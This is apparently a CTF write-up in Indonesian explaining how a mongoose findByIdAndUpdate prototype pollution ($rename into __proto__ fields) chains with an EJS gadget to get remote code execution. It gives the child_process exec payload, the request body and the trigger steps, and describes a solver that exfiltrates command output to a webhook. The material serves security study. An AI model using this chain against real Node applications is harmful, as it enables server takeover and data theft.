# Writeup

> TLDR; Terdapat bug prototype pollution pada library mongoose, lebih tepatnya fungsi findByIdAndUpdate. Kemudian pada EJS, terdapat gadget prototype pollution yang dapat dimanfaatkan sehingga dapat mengubah attack menjadi RCE.

1. Buat sebuah notes baru dengan isi konten berikut:
    ```
    title: 1
    content: JSON.stringify; process.mainModule.require('child_process').exec('<command RCE>')
    ```
2. Edit notes tersebut dengan body request berikut:
    ```
    {
        "$rename": {
            "title": "__proto__.client",
            "content": "__proto__.escapeFunction"
        }
    }
    ```
    Step ini akan menyiapkan agar nantinya saat prototype pollution ditrigger, semua object akan terinject dengan dua atribut, yakni `client` dan `escapeFunction` yang secara berturut-turut akan berisi title dan content pada notes tersebut.
3. Lalu trigger prototype pollution dengan memanggil fungsi `find()` di URL `/stats`.
4. Panggil URL random agar website melakukan render pada error page yang secara tidak langsung akan mengeksekusi RCE.

## How to use solver
> Solver memanfaatkan query parameter pada HTTP untuk eksfiltrasi data

1. Ubah link webhook, command RCE, web target yang diinginkan pada `solver.py`
2. Jalankan `solver.py`, kemudian nanti akan muncul sebuah request pada webhook dengan query berupa base64 hasil dari command RCE yang dieksekusi.

## Reference
- https://huntr.dev/bounties/1eef5a72-f6ab-4f61-b31d-fc66f5b4b467/
- https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce